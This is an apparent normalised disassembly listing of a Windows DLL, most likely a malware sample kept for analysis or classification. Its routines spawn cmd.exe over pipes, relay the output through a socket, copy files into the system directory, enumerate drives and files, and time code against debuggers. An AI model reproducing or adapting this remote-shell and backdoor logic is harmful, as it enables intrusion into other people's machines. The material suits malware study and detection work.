sub_10001000
sub esp 0x27c
mov al 0x65
push esi
mov esi ecx
mov [ esp + 0x9 ] al
mov [ esp + 0xb ] al
mov eax [ esp + 0x284 ]
push edi
mov edi [ CreatePipe@IAT ]
mov [ esi + 0x18 ] eax
lea ecx [ esp + 0x1c ]
lea eax [ esi + 0x4 ]
push 0x0
push ecx
push eax
push esi
mov [ esp + 0x18 ] 0x5c
mov [ esp + 0x19 ] 0x63
mov [ esp + 0x1a ] 0x6d
mov [ esp + 0x1b ] 0x64
mov [ esp + 0x1c ] 0x2e
mov [ esp + 0x1e ] 0x78
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x2c ] 0xc
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x1
mov [ esp + 0x28 ] eax
call edi
test eax eax
jne r-xdata
lea edx [ esp + 0x1c ]
push 0x0
lea ecx [ esi + 0xc ]
lea eax [ esi + 0x8 ]
push edx
push ecx
push eax
mov [ esp + 0x24 ] eax
call edi
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x27c
retn 0x4
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x7d ]
mov [ esp + 0x7c ] 0x0
[ edi ]
push ebx
push ebp
mov ebp [ GetSystemDirectoryA@IAT ]
lea edx [ esp + 0x84 ]
stosw [ edi ]
push 0x104
push edx
stosb [ edi ]
call ebp
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov ebx [ _mbsnbcat@IAT ]
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x84 ]
push ecx
push rw-data
push eax
call ebx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x195 ]
mov [ esp + 0x194 ] 0x0
[ edi ]
add esp 0xc
lea ecx [ esp + 0x188 ]
stosw [ edi ]
push 0x104
push ecx
stosb [ edi ]
call ebp
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x188 ]
push ecx
push edx
push eax
call ebx
add esp 0xc
lea ecx [ esp + 0x84 ]
lea edx [ esp + 0x188 ]
push ecx
push edx
mov ecx esi
call sub_10001200
lea eax [ esp + 0x40 ]
mov [ esp + 0x40 ] 0x44
push eax
call [ GetStartupInfoA@IAT ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x6c ] 0x101
mov eax [ ecx ]
lea ecx [ esp + 0x30 ]
mov [ esp + 0x80 ] eax
mov [ esp + 0x7c ] eax
mov eax [ edx ]
lea edx [ esp + 0x40 ]
push ecx
push edx
push 0x0
push 0x0
push 0x0
push 0x1
mov [ esp + 0x90 ] eax
push 0x0
push 0x0
lea eax [ esp + 0xa4 ]
push eax
push 0x0
call [ CreateProcessA@IAT ]
pop ebp
pop ebx
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x27c
retn 0x4
mov ecx [ esp + 0x28 ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ esp + 0x2c ]
push edx
call esi
pop edi
mov eax 0x1
pop esi
add esp 0x27c
retn 0x4
pop edi
pop esi
add esp 0x27c
retn 0x4
sub_10001200
mov eax [ esp + 0x4 ]
sub esp 0x804
push ebx
push ebp
push esi
mov esi [ esp + 0x818 ]
xor ebp ebp
push edi
push ebp
push esi
push eax
call [ CopyFileA@IAT ]
push rw-data
push esi
call [ fopen@IAT ]
mov ebx eax
add esp 0x8
cmp ebx ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x804
retn 0x8
mov ecx 0x1ff
xor eax eax
lea edi [ esp + 0x16 ]
mov [ esp + 0x14 ] bp
[ edi ]
stosw [ edi ]
shl ebp 0xa
add ebp edi
push 0x0
shl ebp 0x1
push ebp
push ebx
call [ fseek@IAT ]
push ebx
push 0xf
push 0x2
push rw-data
call [ fwrite@IAT ]
push ebx
call [ fclose@IAT ]
add esp 0x20
inc edi
add esi 0x2
cmp edi 0x3f1
jl r-xdata
push 0xf
push rw-data
push esi
call [ _wcsnicmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
inc ebp
cmp eax 0x400
jb r-xdata
jmp r-xdata
push ebx
push 0x400
lea ecx [ esp + 0x1c ]
push 0x2
push ecx
call [ fread@IAT ]
add esp 0x10
mov [ esp + 0x10 ] eax
xor edi edi
lea esi [ esp + 0x14 ]
sub_100012e0
sub esp 0x108
push ebx
push esi
push edi
mov edi [ CreateEventA@IAT ]
push 0x0
push 0x0
push 0x1
mov esi ecx
push 0x0
call edi
push 0x0
push 0x0
push 0x1
push 0x0
mov [ esi + 0x10 ] eax
call edi
mov [ esi + 0x14 ] eax
mov ebx [ _beginthreadex@IAT ]
lea eax [ esp + 0xc ]
push eax
push 0x0
push esi
push sub_100014d0
push 0x0
push 0x0
call ebx
mov edi [ CloseHandle@IAT ]
add esp 0x18
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push esi
push sub_10001410
push 0x0
push 0x0
call ebx
add esp 0x18
test eax eax
je r-xdata
push eax
call edi
mov edx [ esi + 0x14 ]
mov ebx [ WaitForSingleObject@IAT ]
push 0xffffffff
push edx
call ebx
mov eax [ esi + 0x10 ]
push 0xffffffff
push eax
call ebx
mov ecx [ esi ]
push ecx
call edi
mov edx [ esi + 0x8 ]
push edx
call edi
mov eax [ esi + 0x4 ]
push eax
call edi
mov ecx [ esi + 0xc ]
push ecx
call edi
mov edx [ esi + 0x18 ]
push edx
call sub_1000d7d0
add esp 0x4
push eax
call [ closesocket@IAT ]
mov eax [ esi + 0x18 ]
push eax
call sub_1000d5a0
add esp 0x4
lea ecx [ esp + 0x10 ]
push 0x104
push ecx
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
call [ _mbsnbcat@IAT ]
mov ebx [ DeleteFileA@IAT ]
mov edi [ Sleep@IAT ]
add esp 0xc
mov esi 0x3
push eax
call edi
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x108
retn
push 0x1f4
call edi
dec esi
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
call ebx
test eax eax
jne r-xdata
sub_10001410
sub esp 0x8
push ebx
mov ebx [ WriteFile@IAT ]
push ebp
mov ebp [ strncmp@IAT ]
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ free@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x1c ]
push 0x4
push rw-data
push eax
call ebp
add esp 0xc
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edx [ esi + 0xc ]
not ecx
dec ecx
push ecx
push rw-data
push edx
call ebx
mov eax [ esi + 0x14 ]
push eax
call [ SetEvent@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn 0x4
jmp r-xdata
mov eax [ esp + 0x1c ]
push eax
call edi
add esp 0x4
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
mov ecx [ esi + 0xc ]
push edx
push eax
push ecx
call ebx
mov edx [ esp + 0x1c ]
push edx
call edi
add esp 0x4
jmp r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x1c ]
push eax
push ecx
push edx
call sub_100043d0
add esp 0xc
cmp eax 0x1
jne r-xdata
sub_100014d0
sub esp 0x40c
push ebx
mov ebx [ esp + 0x414 ]
push ebp
mov ebp [ WaitForSingleObject@IAT ]
push esi
push edi
mov eax [ esp + 0x10 ]
mov edx [ ebx + 0x14 ]
push 0x32
push edx
call ebp
cmp eax 0x102
jne r-xdata
push 0x64
call [ Sleep@IAT ]
mov [ esp + 0x10 ] 0x0
inc eax
push eax
call [ malloc@IAT ]
mov esi eax
mov eax [ esp + 0x14 ]
mov edi esi
add esp 0x4
lea ecx [ eax + 0x1 ]
xor eax eax
mov edx ecx
push 0x0
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx [ esp + 0x14 ]
mov edx [ ebx ]
lea eax [ esp + 0x18 ]
push eax
push ecx
push esi
push edx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebx + 0x10 ]
push edx
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
push eax
mov eax [ esp + 0x14 ]
mov ecx [ ebx + 0x18 ]
push eax
push esi
push ecx
call sub_100045c0
push esi
call [ free@IAT ]
add esp 0x10
jmp r-xdata
call [ SetEvent@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x40c
retn 0x4
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push eax
lea edx [ esp + 0x18 ]
push ecx
mov ecx [ ebx ]
push edx
lea eax [ esp + 0x28 ]
push 0x400
push eax
push ecx
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
jbe r-xdata
sub_100015c0
push 0xffffffff
push sub_1006b098
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
mov eax [ esp + 0x30 ]
push esi
push eax
mov esi [ eax ]
call [ free@IAT ]
add esp 0x4
lea ecx [ esp + 0x4 ]
call sub_10004bb0
push esi
lea ecx [ esp + 0x8 ]
mov [ esp + 0x30 ] 0x0
call sub_10001000
test eax eax
pop esi
lea ecx [ esp ]
jne r-xdata
call sub_100012e0
lea ecx [ esp ]
call sub_10001750
mov ecx [ esp + 0x20 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn 0x4
call sub_10001750
mov eax 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn 0x4
sub_10001650
mov eax [ esp + 0x4 ]
sub esp 0x200
push ebx
push esi
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ esp + 0x210 ]
push rw-data
push ecx
call sub_1000945d
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
pop esi
pop ebx
add esp 0x200
retn
push edi
mov edi [ fread@IAT ]
push esi
push 0x200
lea edx [ esp + 0x14 ]
push 0x1
push edx
call edi
add esp 0x10
test eax eax
jle r-xdata
pop esi
pop ebx
add esp 0x200
retn
push esi
call [ fclose@IAT ]
push ebx
call sub_10009a35
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x200
retn
push eax
lea eax [ esp + 0x10 ]
push eax
push ebx
call sub_100098dd
push esi
push 0x200
lea ecx [ esp + 0x20 ]
push 0x1
push ecx
call edi
add esp 0x1c
test eax eax
jg r-xdata
sub_10001700
push ebx
push esi
push edi
mov esi ecx
push 0x32
push sub_10001810
push esi
call sub_10001760
push 0x32
push sub_10001890
push esi
mov edi eax
mov ebx edx
call sub_10001760
add esp 0x18
sub edi eax
sbb ebx edx
push 0x0
push 0x32
push ebx
push edi
call sub_1001cfe0
push 0x0
push 0x3e8
push edx
push eax
call sub_1001cfe0
mov [ esi ] eax
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_10001760
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
rdtsc
mov esi eax
mov edi edx
call ebx
rdtsc
pop ebx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xffffffff
xor esi esi
mov edi [ ebp - 0x20 ]
push 0x1
push esi
push esi
mov eax [ ebp - 0x28 ]
push eax
call sub_1001d090
sub eax esi
sbb edx edi
mov ecx [ ebp - 0x1c ]
sub eax ecx
sbb edx esi
mov ecx [ ebp - 0x24 ]
add eax ecx
adc edx esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10001810
sub esp 0x18
lea eax [ esp ]
push ebx
push esi
push edi
push eax
call [ QueryPerformanceFrequency@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x18
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push 0x0
push 0x3e8
push ecx
push edx
call sub_1001cfe0
mov ecx [ esp + 0x28 ]
push 0x0
push ecx
push edx
push eax
call sub_1001d090
mov edi [ QueryPerformanceCounter@IAT ]
mov esi edx
lea edx [ esp + 0x1c ]
mov ebx eax
push edx
call edi
lea eax [ esp + 0x14 ]
push eax
call edi
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
sub ecx eax
mov eax [ esp + 0x18 ]
sbb eax edx
cmp eax esi
jl r-xdata
jg r-xdata
cmp ecx ebx
jb r-xdata
sub_10001890
sub esp 0x18
lea eax [ esp ]
push ebx
push esi
push edi
push eax
call [ QueryPerformanceFrequency@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x18
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push 0x0
push 0x3e8
push ecx
push edx
call sub_1001cfe0
mov ecx [ esp + 0x28 ]
push 0x0
push ecx
push edx
push eax
call sub_1001d090
mov edi [ QueryPerformanceCounter@IAT ]
mov ebx edx
lea edx [ esp + 0x1c ]
mov esi eax
push edx
call edi
cmp ecx ebx
je r-xdata
lea eax [ esp + 0x14 ]
push eax
call edi
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
sub eax ecx
mov ecx [ esp + 0x18 ]
sbb ecx edx
cmp eax esi
jne r-xdata
sub_10001910
push esi
mov esi [ esp + 0x8 ]
push esi
call [ GetFileAttributesA@IAT ]
test al 0x10
push esi
je r-xdata
call sub_10002a70
add esp 0x4
pop esi
retn 0x4
call sub_10002a90
add esp 0x4
pop esi
retn 0x4
sub_10001980
sub esp 0x368
push ebx
push ebp
push esi
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x275 ]
mov [ esp + 0x274 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x37c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x274 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x274 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x30 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x278 ]
push ecx
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x14 ] eax
jne r-xdata
push 0x104
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x368
retn 0x4
mov ecx 0x41
xor eax eax
mov edi ebx
lea edx [ esp + 0x170 ]
[ edi ]
mov ecx 0x40
lea edi [ esp + 0x171 ]
mov [ esp + 0x170 ] al
push ebx
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x174 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x80
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
push 0x1
push eax
and ecx 0x3
push 0x1
lea eax [ esp + 0x188 ]
push 0x40000000
push eax
[ edi ] [ esi ]
call sub_10002d60
mov esi eax
add esp 0x20
cmp esi 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x368
retn 0x4
mov ebp [ WriteFile@IAT ]
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x368
retn 0x4
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x30 ]
push eax
push ecx
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea edx [ esp + 0x5c ]
push rw-data
push edx
call edi
add esp 0x8
test eax eax
je r-xdata
mov edi [ _mbscmp@IAT ]
lea ecx [ esp + 0x5c ]
push rw-data
push ecx
call edi
add esp 0x8
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x368
retn 0x4
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x44 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x50 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x24 ] eax
lea edi [ esp + 0x5c ]
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x48 ]
[ edi ]
not ecx
dec ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x28 ] ecx
lea ecx [ esp + 0x10 ]
push eax
push ecx
lea edx [ esp + 0x20 ]
push 0x14
push edx
push esi
call ebp
mov ecx [ esp + 0x28 ]
lea eax [ esp + 0x10 ]
push 0x0
push eax
lea edx [ esp + 0x64 ]
push ecx
push edx
push esi
call ebp
sub_10001bd0
mov eax [ esp + 0x4 ]
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
retn 0x4
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
retn 0x4
sub_10001c20
sub esp 0x3c
push ebx
push ebp
mov ebp [ esp + 0x48 ]
push esi
push edi
xor ebx ebx
mov al 0x5c
push 0x8003
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] 0x3a
mov [ esp + 0x1a ] al
mov [ esp + 0x1b ] al
mov [ esp + 0x1c ] bl
mov [ esp + 0x54 ] ebx
call [ SetErrorMode@IAT ]
mov [ esp + 0x10 ] 0x1
mov eax [ esp + 0x10 ]
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x34 ] eax
jmp [ eax * 4 + jump_table_10001e24 ]
mov al [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
add al 0x41
push ecx
mov [ esp + 0x18 ] al
call [ GetDriveTypeA@IAT ]
mov ecx 0x6
cmp eax ecx
ja r-xdata
push ebx
call [ SetErrorMode@IAT ]
mov eax [ esp + 0x50 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x3c
retn 0x4
mov edx [ esp + 0x10 ]
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x34 ] edx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x34 ] eax
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x38 ] 0x2
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x34 ] eax
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x38 ] 0x3
mov eax [ esp + 0x10 ]
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x34 ] eax
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x38 ] 0x4
jmp r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x24 ]
mov [ esp + 0x34 ] ecx
lea eax [ esp + 0x1c ]
push edx
lea ecx [ esp + 0x30 ]
push eax
lea edx [ esp + 0x1c ]
push ecx
push edx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x48 ] 0x5
call [ GetDiskFreeSpaceExA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x34 ] edx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x38 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0x1a
mov [ esp + 0x10 ] eax
jl r-xdata
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x38 ] ebx
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x1c ]
push ecx
lea eax [ esp + 0x30 ]
push edx
lea ecx [ esp + 0x1c ]
push eax
push ecx
call [ GetDiskFreeSpaceExA@IAT ]
test eax eax
je r-xdata
mov ecx 0x6
jmp r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] edx
mov edx [ esp + 0x28 ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] edx
mov eax [ esp + 0x50 ]
mov edi ebp
add ebp 0x18
lea esi [ esp + 0x34 ]
inc eax
[ edi ] [ esi ]
mov [ esp + 0x50 ] eax
mov ecx 0x6
jmp r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x28 ]
mov [ esp + 0x40 ] ecx
mov [ esp + 0x44 ] edx
mov [ esp + 0x48 ] eax
sub_10001e40
push esi
push 0x24
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor eax eax
pop esi
retn 0x4
mov eax [ esp + 0x8 ]
push esi
push 0x0
push eax
call [ GetFileAttributesExA@IAT ]
test eax eax
je r-xdata
push esi
call [ free@IAT ]
add esp 0x4
mov eax esi
pop esi
retn 0x4
sub_10001e80
sub esp 0x54
xor eax eax
push edi
mov [ esp + 0x4 ] eax
mov ecx 0x10
mov [ esp + 0x8 ] eax
lea edi [ esp + 0x18 ]
mov [ esp + 0xc ] eax
mov [ esp + 0x14 ] 0x44
[ edi ]
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
push eax
push eax
push 0x8000000
push eax
push eax
mov [ esp + 0x2c ] eax
push eax
mov eax [ esp + 0x7c ]
push eax
push 0x0
call [ CreateProcessA@IAT ]
pop edi
add esp 0x54
retn 0x4
sub_10001ee0
sub esp 0x104
push ebx
push ebp
push esi
mov ebp ecx
push 0x104
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
push edi
mov ecx 0x41
xor eax eax
mov edi ebx
[ edi ]
mov ecx 0x40
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] al
lea edx [ esp + 0x10 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x80
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push 0x1
push eax
and ecx 0x3
push 0x1
lea eax [ esp + 0x28 ]
push 0x40000000
push eax
[ edi ] [ esi ]
call sub_10002d60
add esp 0x20
mov esi eax
cmp esi 0xffffffff
pop edi
jne r-xdata
pop esi
pop ebp
pop ebx
add esp 0x104
retn 0x4
mov ecx [ esp + 0x114 ]
push esi
push ecx
mov ecx ebp
call sub_10001fe0
push esi
call [ CloseHandle@IAT ]
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x104
retn 0x4
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ebp
pop ebx
add esp 0x104
retn 0x4
sub_10001fe0
sub esp 0x354
push ebx
push ebp
push esi
mov [ esp + 0x1c ] ecx
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x125 ]
mov [ esp + 0x124 ] 0x0
mov edx [ esp + 0x368 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi edx
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0x124 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp [ esp + ecx + 0x123 ] 0x5c
je r-xdata
lea edi [ esp + 0x124 ]
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x36c ]
[ edi ]
not ecx
mov ebx [ WriteFile@IAT ]
dec ecx
push eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] ecx
push eax
lea ecx [ esp + 0x18 ]
push 0x4
push ecx
push ebp
call ebx
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0x18 ]
push 0x4
push eax
push ebp
call ebx
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
lea eax [ esp + 0x12c ]
push edx
push eax
push ebp
call ebx
lea edi [ esp + 0x124 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x24 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x24 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x224 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
call [ FindFirstFileA@IAT ]
mov [ esp + 0x18 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x124 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ esp + 0x18 ]
push edx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x354
retn 0x8
lea ecx [ esp + 0x250 ]
push rw-data
push ecx
call [ _mbscmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x224 ]
push edx
push eax
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x250 ]
push rw-data
push edx
call [ _mbscmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x368 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
lea esi [ esp + 0x24 ]
sub edi ecx
mov eax ecx
mov [ esp + 0x1c ] esi
mov esi edi
mov edi [ esp + 0x1c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp [ esp + ecx + 0x23 ] 0x5c
je r-xdata
lea edi [ esp + 0x250 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x24 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov al [ esp + 0x224 ]
mov ecx edx
and ecx 0x3
test al 0x10
[ edi ] [ esi ]
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x24 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x240 ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x24 ]
[ edi ]
not ecx
sub edi ecx
push ebp
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x28 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x28 ]
